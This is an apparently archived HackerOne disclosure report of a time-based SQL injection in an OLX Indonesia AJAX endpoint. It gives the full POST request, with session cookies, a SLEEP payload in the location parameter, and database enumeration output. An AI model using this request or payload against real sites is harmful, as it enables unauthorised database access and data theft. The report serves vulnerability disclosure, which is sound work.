@@ -1,0 +1,48 @@
+ReportLink:https://hackerone.com/reports/639876
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/nullcod3r
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:20.08.2019 21:54:11
+
+Summary:
+
+I found the SQL Injection on the website https://www.olx.co.id
+
+Affectected URL :  https://www.olx.co.id/ajax/buybundle/getbundle/
+
+POC:
+1) In this below request i got SQL injection vulnerability in location parameter (post method)
+
+POST /ajax/buybundle/getbundle/ HTTP/1.1
+Host: www.olx.co.id
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3790.0 Safari/537.36
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 39
+DNT: 1
+Connection: close
+Referer: https://www.olx.co.id/iklanku/belikuota/
+Cookie: PHPSESSID=29fehe5f8eaduvg5cudichht36; mobile2=desktop; onap=16bdd5da313x5c4483aa-1-16bdd5da313x5c4483aa-59-1562791780; test_idGeo=a; _gcl_au=1.1.80001931.1562787033; from_detail=0; ins-mig-done=1; G_ENABLED_IDPS=google; remember_login=96017983%3B951881f63b1236c7a932ee3f8d003d03; user_id=96017983; last_paidads_provider_=payment_chk_0; observed5_id=234772604; observed5_sec=6YnW9t9QjecVgj%2F4OE3FUg%3D%3D; last_locations=212-0-0-Malang+Kota-Jawa+Timur-malang%3Akota; my_city_2=212_0_0_Malang+Kota_0_Jawa+Timur_malang%3Akota; __zlcmid=tDiNNPSGTQH0Zc; observed5_view=tiles; AWSELB=5BAF4995185E44C89D2195E4E8346CEE56208525AB4040445FB0801930C2BF82238B04C1A2EF855A72733ADF1543A7B8EC357E95F1AD4FA463DCD24B6457F7553116FE4B29
+
+category=86&subcategory=4760&location={sql_command}
+
+2) while injecting this payload in location parameter (select*from(select(sleep(5)))a) server responds with a delay of 10 second. (screenshot attached below) which confirms the sql injection.
+
+Payload : (SELECT * FROM (SELECT(SLEEP(5)))a)
+back-end DBMS is MySQL
+web application technology: Apache
+
+available databases [2]:                                                                                                                         
+ information_schema
+ olxid
+
+## Impact
+
+A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.
+Reference :  https://www.owasp.org/index.php/Top_10-2017_A1-Injection
